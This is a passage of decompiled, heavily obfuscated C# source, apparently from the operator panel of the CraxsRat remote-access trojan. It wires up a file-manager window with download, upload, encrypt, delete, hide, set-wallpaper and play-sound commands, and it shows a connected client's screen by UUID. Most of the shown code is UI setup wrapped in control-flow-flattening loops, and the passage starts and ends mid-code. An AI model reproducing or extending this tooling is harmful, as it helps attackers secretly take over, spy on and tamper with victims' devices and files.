      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._pathtxt = value;
    }

    internal virtual DrakeUIButtonIcon ClearButton
    {
      get => ((Jector) this)._ClearButton;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.ClearButton_Click_1);
        DrakeUIButtonIcon clearButton = ((Jector) this)._ClearButton;
label_1:
        int num1 = 566686816;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((~num1 ^ (783946769 * 764873493 + (1972809558 ^ 501997518) - -~-1814477046) * 332602275) - -959925931 * (-955737345 - ~-1952024427) ^ -1241418189 - 941711543 ^ 1605549055) * 1807280259)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = clearButton == null ? -39773715 : (num3 = 571576705);
              num1 = num3 ^ (int) num2 * 2122999857;
              continue;
            case 2:
              goto label_3;
            case 3:
              ((Jector) this)._ClearButton = value;
              clearButton = ((Jector) this)._ClearButton;
              num1 = -743004716;
              continue;
            case 4:
              clearButton.Click += eventHandler;
              num1 = (int) num2 * 1145131138 ^ 1960858064;
              continue;
            case 5:
              int num4 = clearButton == null ? -295773992 : (num4 = 1366309986);
              num1 = num4 ^ (int) num2 * -1324921822;
              continue;
            case 6:
              clearButton.Click -= eventHandler;
              num1 = (int) num2 * 1436201868 ^ 1506688008;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual DrakeUIAvatar clearsrchbtn
    {
      get => ((Jector) this)._clearsrchbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Clearsrchbtn_Click);
label_1:
        int num1 = -1077900931;
        DrakeUIAvatar clearsrchbtn;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~num1 - -~(~1327685854 + (-1644202884 - 1028567031)) + -~--1393514389 - ~1357522891 - 2143607877 * 1433017417 + 1973000558)) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = clearsrchbtn == null ? -329141772 : (num3 = -280334108);
              num1 = num3 ^ (int) num2 * -1498200287;
              continue;
            case 2:
              int num4 = clearsrchbtn == null ? 923419992 : (num4 = -1903257916);
              num1 = num4 ^ (int) num2 * -1449807332;
              continue;
            case 3:
              clearsrchbtn = ((Jector) this)._clearsrchbtn;
              num1 = (int) num2 * -467522893 ^ 1355155581;
              continue;
            case 4:
              clearsrchbtn = ((Jector) this)._clearsrchbtn;
              num1 = (int) num2 * -1830540215 ^ 443841238;
              continue;
            case 5:
              clearsrchbtn.Click -= eventHandler;
              num1 = (int) num2 * 1796663594 ^ 1078029390;
              continue;
            case 6:
              clearsrchbtn.Click += eventHandler;
              num1 = (int) num2 * -474665264 ^ -1061255838;
              continue;
            case 7:
              ((Jector) this)._clearsrchbtn = value;
              num1 = 2130225392;
              continue;
            case 8:
              goto label_1;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DrakeUITextBox searchtext
    {
      get => ((Jector) this)._searchtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Searchtext_TextChanged);
        DrakeUITextBox searchtext = ((Jector) this)._searchtext;
label_1:
        int num1 = 977289130;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(~num1 ^ -(632878463 * -2131195575 - ~-1173217999 ^ ~(666410651 - -931917102))) * -1535303147 * 499804585 * -1590922921)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = searchtext == null ? 1587819884 : (num3 = -478367840);
              num1 = num3 ^ (int) num2 * 834093851;
              continue;
            case 2:
              ((Jector) this)._searchtext = value;
              num1 = 1274975653;
              continue;
            case 3:
              searchtext.TextChanged += eventHandler;
              num1 = (int) num2 * -879504252 ^ -254731768;
              continue;
            case 4:
              searchtext = ((Jector) this)._searchtext;
              num1 = (int) num2 * 1132588218 ^ 998164598;
              continue;
            case 5:
              int num4 = searchtext == null ? -1021063756 : (num4 = 1711686888);
              num1 = num4 ^ (int) num2 * 1221617776;
              continue;
            case 6:
              searchtext.TextChanged -= eventHandler;
              num1 = (int) num2 * -728408319 ^ 526294681;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual DrakeUIAvatar searchbtn
    {
      get => ((Jector) this)._searchbtn;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Searchbtn_Click);
        DrakeUIAvatar searchbtn = ((Jector) this)._searchbtn;
label_1:
        int num1 = -1896535648;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-~num1 ^ -(1406829625 - 504690125) ^ --621616734 ^ ~-329753211)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              int num3 = searchbtn == null ? 821779518 : (num3 = 990745808);
              num1 = num3 ^ (int) num2 * -1319740396;
              continue;
            case 3:
              searchbtn.Click += eventHandler;
              num1 = (int) num2 * -99555364 ^ -595096598;
              continue;
            case 4:
              ((Jector) this)._searchbtn = value;
              searchbtn = ((Jector) this)._searchbtn;
              num1 = -1204644959;
              continue;
            case 5:
              searchbtn.Click -= eventHandler;
              num1 = (int) num2 * -88071283 ^ 1689416471;
              continue;
            case 6:
              int num4 = searchbtn == null ? 1190085641 : (num4 = 1506502571);
              num1 = num4 ^ (int) num2 * -1750553343;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel4
    {
      get => ((Jector) this)._Panel4;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._Panel4 = value;
    }

    internal virtual Label Label1
    {
      get => ((Jector) this)._Label1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._Label1 = value;
    }

    internal virtual DrakeUICheckBox thumb_chk
    {
      get => ((Jector) this)._thumb_chk;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._thumb_chk = value;
    }

    internal virtual DrakeUIButtonIcon Downpic
    {
      get => ((Jector) this)._Downpic;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.MetroSetBadge1_Click);
        DrakeUIButtonIcon downpic = ((Jector) this)._Downpic;
label_1:
        int num1 = 1949080465;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~~((num1 + -(~((-1275559702 ^ -214792674) - (1556847030 + 320718718)) ^ -(611896818 - (-215983133 ^ 1619949463)))) * -1520153075 * -1262139605) ^ -1614392979)) % 8U)
          {
            case 0:
              goto label_1;
            case 1:
              int num3 = downpic == null ? 1738946328 : (num3 = 242847395);
              num1 = num3 ^ (int) num2 * 726673359;
              continue;
            case 2:
              downpic = ((Jector) this)._Downpic;
              num1 = (int) num2 * 6685665 ^ 1406884536;
              continue;
            case 3:
              ((Jector) this)._Downpic = value;
              num1 = 792999702;
              continue;
            case 4:
              downpic.Click -= eventHandler;
              num1 = (int) num2 * 586663947 ^ 1915803027;
              continue;
            case 5:
              downpic.Click += eventHandler;
              num1 = (int) num2 * 912276949 ^ 981106810;
              continue;
            case 6:
              int num4 = downpic == null ? 1951826635 : (num4 = -402345187);
              num1 = num4 ^ (int) num2 * -579750616;
              continue;
            case 7:
              goto label_3;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual Label Downloadnum
    {
      get => ((Jector) this)._Downloadnum;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Jector) this)._Downloadnum = value;
    }

    private void SpyStyle()
    {
    }

    public void CraxsRatkfvuiorkenfudpajrsnCraxsRatskigysereax()
    {
      string language = RegistryHandler.Get_Language();
      if (Operators.CompareString(language, EXGuarder.\u00370096005, false) == 0)
        goto label_11;
label_1:
      int num1 = 137984378;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-num1 ^ -(496840717 * -1747569387) + ~((587093828 ^ -2126666876) - 242770344) ^ -377873814) - -(1568160971 ^ -352586716))) % 44U)
        {
          case 0:
            this.cancelbtn.Text = EXGuarder.\u00309740533;
            this.Downpic.Text = EXGuarder.\u00319791E35;
            num1 = (int) num2 * 69638144 ^ 94519866;
            continue;
          case 1:
            this.sdbtn.Text = EXGuarder.\u0030E636C1D;
            this.dcmbtn.Text = EXGuarder.\u0032E166531;
            num1 = (int) num2 * 526053807 ^ -83596559;
            continue;
          case 2:
            this.ctxMenu.Items[7].Text = EXGuarder.\u003552D4A60;
            this.ctxMenu.Items[8].Text = EXGuarder.\u00379085A1D;
            this.ctxMenu.Items[9].Text = EXGuarder.\u0034F0B3D26;
            this.ctxMenu.Items[10].Text = EXGuarder.\u00309740533;
            num1 = (int) num2 * 1834450730 ^ -1531185736;
            continue;
          case 3:
            this.ctxMenu.Items[17].Text = EXGuarder.\u0036D560746;
            num1 = (int) num2 * -573074688 ^ -2116375923;
            continue;
          case 4:
            this.DGV0.Columns[3].HeaderText = EXGuarder.\u00344386B58;
            num1 = (int) num2 * 593147309 ^ -322935800;
            continue;
          case 5:
            int num3 = Operators.CompareString(language, EXGuarder.\u0033F15756B, false) != 0 ? 1207783877 : (num3 = -1297752146);
            num1 = num3 ^ (int) num2 * 1913117617;
            continue;
          case 6:
            this.ctxMenu.Items[8].Text = EXGuarder.\u0030A291063;
            num1 = (int) num2 * 1986194648 ^ 27668284;
            continue;
          case 7:
            this.ctxMenu.Items[10].Text = EXGuarder.\u0030136202F;
            this.ctxMenu.Items[11].Text = EXGuarder.\u003220D1E4C;
            this.ctxMenu.Items[12].Text = EXGuarder.\u0035A0D574A;
            num1 = (int) num2 * 1605369743 ^ 139252749;
            continue;
          case 8:
            this.ctxMenu.Items[5].Text = EXGuarder.\u0034522785D;
            num1 = (int) num2 * -1748941021 ^ 1937916430;
            continue;
          case 9:
            this.sdbtn.Text = EXGuarder.\u00338666E67;
            num1 = (int) num2 * -2056339566 ^ 1289679295;
            continue;
          case 10:
            this.ctxMenu.Items[2].Text = EXGuarder.\u00333192804;
            this.ctxMenu.Items[3].Text = EXGuarder.\u00340401423;
            this.ctxMenu.Items[4].Text = EXGuarder.\u003552A6134;
            num1 = (int) num2 * 285882514 ^ -890452889;
            continue;
          case 11:
            this.DGV0.Columns[4].HeaderText = EXGuarder.\u003364D1D40;
            num1 = (int) num2 * -1713807391 ^ -1156739176;
            continue;
          case 12:
            this.DGV0.Columns[0].HeaderText = EXGuarder.\u0030A405663;
            this.DGV0.Columns[1].HeaderText = EXGuarder.\u003025D4E50;
            this.DGV0.Columns[2].HeaderText = EXGuarder.\u00378254B6E;
            num1 = (int) num2 * -1771993152 ^ 1657576503;
            continue;
          case 13:
            this.DGV0.Columns[3].HeaderText = EXGuarder.\u0035E456117;
            num1 = (int) num2 * -835707029 ^ -934861165;
            continue;
          case 14:
            this.ctxMenu.Items[18].Text = EXGuarder.\u003304E5010;
            num1 = (int) num2 * 2111984926 ^ 615464408;
            continue;
          case 15:
            this.DGV0.Columns[4].HeaderText = EXGuarder.\u00343307045;
            this.ctxMenu.Items[0].Text = EXGuarder.\u003296B5B13;
            num1 = (int) num2 * 1138313485 ^ 911546225;
            continue;
          case 16:
            this.ctxMenu.Items[6].Text = EXGuarder.\u0035110644B;
            this.ctxMenu.Items[7].Text = EXGuarder.\u00325736C3D;
            num1 = (int) num2 * 1100420176 ^ 1307526193;
            continue;
          case 17:
            this.picbtn.Text = EXGuarder.\u0032D2C703B;
            num1 = (int) num2 * 1618514643 ^ 1587789708;
            continue;
          case 18:
            this.cancelbtn.Text = EXGuarder.\u0033E501E31;
            num1 = (int) num2 * 2055230561 ^ 1453151059;
            continue;
          case 19:
            this.ctxMenu.Items[13].Text = EXGuarder.\u0030A16451E;
            num1 = (int) num2 * 1243559568 ^ -523041147;
            continue;
          case 20:
            this.ctxMenu.Items[2].Text = EXGuarder.\u003584B346C;
            this.ctxMenu.Items[3].Text = EXGuarder.\u00359694C44;
            this.ctxMenu.Items[4].Text = EXGuarder.\u003304E5010;
            this.ctxMenu.Items[5].Text = EXGuarder.\u003366E7063;
            num1 = (int) num2 * -2126311487 ^ -1024636229;
            continue;
          case 21:
            this.ctxMenu.Items[6].Text = EXGuarder.\u0034E5D4E76;
            num1 = (int) num2 * -375725216 ^ -775215387;
            continue;
          case 22:
            this.ctxMenu.Items[18].Text = EXGuarder.\u00319791E35;
            num1 = (int) num2 * -2033465562 ^ -1053406792;
            continue;
          case 23:
            this.ctxMenu.Items[13].Text = EXGuarder.\u003051F0153;
            this.ctxMenu.Items[14].Text = EXGuarder.\u003395A096D;
            num1 = (int) num2 * -805422922 ^ 1437297838;
            continue;
          case 24:
            this.ctxMenu.Items[0].Text = EXGuarder.\u00342305738;
            this.ctxMenu.Items[1].Text = EXGuarder.\u0034E72104C;
            num1 = (int) num2 * -1267109681 ^ 2011165597;
            continue;
          case 25:
            this.ThumbsCont.Text = EXGuarder.\u003066A7212;
            num1 = (int) num2 * 915710687 ^ -1464398548;
            continue;
          case 26:
            this.Downpic.Text = EXGuarder.\u003304E5010;
            num1 = (int) num2 * -1828416449 ^ 1960804184;
            continue;
          case 27:
            this.ctxMenu.Items[15].Text = EXGuarder.\u0036F661272;
            num1 = (int) num2 * -140112206 ^ -1912155267;
            continue;
          case 28:
            this.ctxMenu.Items[16].Text = EXGuarder.\u00316400F00;
            num1 = (int) num2 * 1677555406 ^ 2046492048;
            continue;
          case 29:
            goto label_11;
          case 30:
            this.dcmbtn.Text = EXGuarder.\u0033C015C5A;
            this.picbtn.Text = EXGuarder.\u003692C3A04;
            num1 = (int) num2 * 1509246577 ^ 726018588;
            continue;
          case 31:
            this.ctxMenu.Items[9].Text = EXGuarder.\u0033C6B3176;
            num1 = (int) num2 * -1737337927 ^ -1962951845;
            continue;
          case 32:
            this.ThumbsCont.Text = EXGuarder.\u0031B0A1006;
            num1 = (int) num2 * -1179359891 ^ 1741253544;
            continue;
          case 33:
            goto label_1;
          case 34:
            this.ctxMenu.Items[15].Text = EXGuarder.\u00378206071;
            num1 = (int) num2 * 1396216437 ^ 131897549;
            continue;
          case 35:
            goto label_3;
          case 36:
            this.cancelbtn.Text = EXGuarder.\u0032F0D7976;
            num1 = (int) num2 * -1522182018 ^ 958279797;
            continue;
          case 37:
            this.ctxMenu.Items[1].Text = EXGuarder.\u0036C12495B;
            num1 = (int) num2 * -212637834 ^ 548831921;
            continue;
          case 38:
            this.ctxMenu.Items[14].Text = EXGuarder.\u003452A5325;
            num1 = (int) num2 * -2007487055 ^ -1174991245;
            continue;
          case 39:
            this.ctxMenu.Items[11].Text = EXGuarder.\u00326564466;
            num1 = (int) num2 * -591779454 ^ -1100954529;
            continue;
          case 40:
            this.ctxMenu.Items[16].Text = EXGuarder.\u00348357315;
            this.ctxMenu.Items[17].Text = EXGuarder.\u00319475C75;
            num1 = (int) num2 * -1116478427 ^ -1047207947;
            continue;
          case 41:
            this.DGV0.Columns[2].HeaderText = EXGuarder.\u003682A094E;
            num1 = (int) num2 * -912943142 ^ -1374992940;
            continue;
          case 42:
            this.ctxMenu.Items[12].Text = EXGuarder.\u0035B54724C;
            num1 = (int) num2 * 1165278815 ^ -875409050;
            continue;
          case 43:
            this.DGV0.Columns[0].HeaderText = EXGuarder.\u00358217574;
            this.DGV0.Columns[1].HeaderText = EXGuarder.\u0032A1D7619;
            num1 = (int) num2 * -266059788 ^ 1947841946;
            continue;
          default:
            goto label_46;
        }
      }
label_3:
      return;
label_46:
      return;
label_11:
      this.cancelbtn.Text = EXGuarder.\u0033C50614B;
      num1 = 1284448007;
      goto label_2;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxcaxca(object sender, EventArgs e)
    {
      this.SetStyle(ControlStyles.UserPaint | ControlStyles.SupportsTransparentBackColor | ControlStyles.AllPaintingInWmPaint | ControlStyles.OptimizedDoubleBuffer, true);
label_1:
      int num1 = 691331491;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 * -868354927 ^ 1450327231 * ~(-39203982 ^ -1596198805 - -1612805026) ^ -1177228216)) % 10U)
        {
          case 0:
            this.Timer2.Start();
            this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * -1975802720 ^ -103976709;
            continue;
          case 1:
            this.ActiveControl = (Control) this.DGV0;
            num1 = (int) num2 * 437068750 ^ -319565687;
            continue;
          case 2:
            this.CraxsRatkfvuiorkenfudpajrsnCraxsRatskigysereax();
            num1 = (int) num2 * 1507835163 ^ -288363770;
            continue;
          case 3:
            this.Timer1.Start();
            num1 = (int) num2 * -1142772116 ^ 1550117544;
            continue;
          case 4:
            goto label_1;
          case 5:
            // ISSUE: reference to a compiler-generated field
            this.Tag = (object) (EXGuarder.\u0032D620218 + ((Data._Closure\u0024__39\u002D12) ((Jector) this).classClient).UUID);
            num1 = (int) num2 * 725301674 ^ -1332157947;
            continue;
          case 6:
            this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0031F770B26);
            // ISSUE: reference to a compiler-generated field
            this.usrscreen.Image = (Image) reso.GetScreen(((Data._Closure\u0024__39\u002D10) ((Jector) this).classClient).Screen);
            num1 = (int) num2 * 1267749274 ^ 1918254064;
            continue;
          case 8:
            // ISSUE: reference to a compiler-generated method
            ((Jector) this).Q = Convert.ToString(MySettings.get_Settings().ImageQualty);
            num1 = (int) num2 * -446383725 ^ -1509772670;
            continue;
          case 9:
            this.DGV0.DefaultCellStyle.Font = Settings.f;
            num1 = (int) num2 * -310071869 ^ -1777264548;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      this.Text = ((Jector) this).Title;
      try
      {
        // ISSUE: reference to a compiler-generated field
        if (((Data._Closure\u0024__39\u002D5) ((Jector) this).classClient).Row != null)
          ;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      this.Label1.Text = EXGuarder.\u00313602B37;
      this.OpenToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
label_16:
      int num3 = -710464609;
      while (true)
      {
        uint num4;
        switch ((num4 = (uint) (num3 * -868354927 ^ 1450327231 * ~(-39203982 ^ -1596198805 - -1612805026) ^ -1177228216)) % 40U)
        {
          case 0:
            this.UploadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * -1013234833 ^ -148285034;
            continue;
          case 1:
            this.CutToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            this.CutToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u003732A3710);
            num3 = (int) num4 * -1667917674 ^ 1009018749;
            continue;
          case 2:
            this.PasteToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u00374231828);
            num3 = (int) num4 * -564671006 ^ 196955140;
            continue;
          case 3:
            this.ShowToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u00345063126);
            num3 = (int) num4 * 928352598 ^ 2060512892;
            continue;
          case 4:
            this.UnZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * 1745301986 ^ -1979851568;
            continue;
          case 5:
            this.PasteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * -1848749402 ^ 1963357612;
            continue;
          case 6:
            this.SetWallpaperToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u00356625D08);
            num3 = (int) num4 * 997849274 ^ 1951630073;
            continue;
          case 7:
            this.FolderDownloadsToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u00315507054);
            num3 = (int) num4 * -37762787 ^ -151014025;
            continue;
          case 8:
            this.PasteToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * -2143367580 ^ -984467578;
            continue;
          case 9:
            this.PlaySoundToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u0035C5D6F04);
            num3 = (int) num4 * 1838828203 ^ -1387484483;
            continue;
          case 10:
            this.AddFilesToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u003164A332F);
            num3 = (int) num4 * -840619965 ^ 1443115315;
            continue;
          case 11:
            this.CutToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * -337913086 ^ 412513691;
            continue;
          case 12:
            this.EncryptToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            this.EncryptToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u00336685269);
            num3 = (int) num4 * -1670429211 ^ 447620963;
            continue;
          case 13:
            this.SetWallpaperToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            this.PlaySoundToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * 1265139984 ^ 477896673;
            continue;
          case 14:
            this.ShowToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            this.FolderDownloadsToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * -130507976 ^ -1388541657;
            continue;
          case 15:
            this.CopyToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * 1243074228 ^ -784247431;
            continue;
          case 16:
            this.ZipToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * -1658646928 ^ -1718276996;
            continue;
          case 17:
            this.ZipToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            this.ZipToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u0036474395A);
            num3 = (int) num4 * 1530062487 ^ 2001414559;
            continue;
          case 18:
            this.TOpacity.Enabled = true;
            num3 = (int) num4 * -181698369 ^ -1318662521;
            continue;
          case 19:
            this.DecodeToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * -504616002 ^ -911048197;
            continue;
          case 20:
            this.DecodeToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            this.DecodeToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u0032C666F15);
            num3 = (int) num4 * -1906273736 ^ -1865851725;
            continue;
          case 21:
            this.AddFilesToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            this.RenameToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            this.RenameToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u0034F754D15);
            num3 = (int) num4 * -392540020 ^ 587464413;
            continue;
          case 22:
            this.SetWallpaperToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * -508669266 ^ -283755038;
            continue;
          case 23:
            this.OpenToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u003780E0F10);
            num3 = (int) num4 * -1682990262 ^ 1134833044;
            continue;
          case 24:
            this.UnZipToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u00309002930);
            num3 = (int) num4 * -605172311 ^ -822078377;
            continue;
          case 25:
            goto label_18;
          case 26:
            this.OpenToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            this.DownloadToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * -1186730357 ^ -1623652955;
            continue;
          case 27:
            goto label_16;
          case 28:
            this.DeleteToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u00376206961);
            this.DeleteToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            this.AddFilesToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * -1839261858 ^ -1368455502;
            continue;
          case 29:
            this.CopyToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            this.CopyToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u00312213338);
            num3 = (int) num4 * 461534365 ^ -14219594;
            continue;
          case 30:
            this.UploadToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u0031B1E065C);
            this.UploadToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * 728820057 ^ 930703298;
            continue;
          case 31:
            this.UnZipToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            this.DeleteToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * 345457887 ^ -9320003;
            continue;
          case 32:
            this.HideToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u003673B023B);
            this.HideToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * -1441736666 ^ -1285950507;
            continue;
          case 33:
            this.RenameToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            this.EditToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * -273242477 ^ 605660873;
            continue;
          case 34:
            this.EditToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u00334544846);
            this.EditToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            this.HideToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * -216015955 ^ 1616407018;
            continue;
          case 35:
            this.DownloadToolStripMenuItem.Image = (Image) new Bitmap(Settings.res_Path + EXGuarder.\u0032F420723);
            this.DownloadToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * -1524729260 ^ -268686588;
            continue;
          case 36:
            this.FolderDownloadsToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * -1442030220 ^ -1201750743;
            continue;
          case 37:
            this.ShowToolStripMenuItem.ImageScaling = ToolStripItemImageScaling.None;
            num3 = (int) num4 * 2043984445 ^ 821726938;
            continue;
          case 38:
            this.PlaySoundToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            this.TOpacity.Interval = Settings.T_Interval;
            num3 = (int) num4 * -264981316 ^ 296686586;
            continue;
          case 39:
            this.EncryptToolStripMenuItem.Tag = (object) new object[3]
            {
              (object) 0,
              (object) EXGuarder.\u0031A020A37,
              (object) EXGuarder.\u0031A020A37
            };
            num3 = (int) num4 * 654788215 ^ 1612969205;
            continue;
          default:
            goto label_13;
        }
      }
label_18:
      return;
label_13:;
    }

    private void DGV0_SortCompare(object sender, DataGridViewSortCompareEventArgs e)
    {
      if (e.RowIndex1 != 0)
        return;
label_1:
      int num1 = -1247390986;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (((262666363 + 189146145 ^ -696466740 - 1978093553) - --num2 * 1465464471 - (165088357 - 63470366)) * 785547459)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            e.Handled = true;
            num1 = (int) num3 * -105783042 ^ -578345593;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DGV0_CellMouseDoubleClick(object sender, DataGridViewCellMouseEventArgs e)
    {
      try
      {
        int index = this.DGV0.CurrentRow.Index;
label_1:
        int num1 = 479869768;
        string text;
        object[] objArray;
        string str;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(~num1 + (~(2011575185 * 1509985243) + -1909412180 * 2074939379 + (841766365 - 906281513 + -(-778259589 * 1725663484))))) % 10U)
          {
            case 0:
              ((Jector) this).Correntindex = this.DGV0.CurrentRow.Index;
              num1 = (int) num2 * 1283108072 ^ 100874790;
              continue;
            case 2:
              num1 = (int) num2 * 1011251702 ^ -1260914326;
              continue;
            case 3:
              ((Jector) this).Correntindex = this.DGV0.CurrentRow.Index;
              num1 = (int) num2 * 2058426875 ^ 1658107354;
              continue;
            case 4:
              objArray = (object[]) ((Jector) this).paths_indexs[text];
              num1 = 1313612915;
              continue;
            case 5:
              goto label_1;
            case 6:
              string Left = Conversions.ToString(objArray[0]);
              index = this.DGV0.CurrentRow.Index;
              string Right = index.ToString();
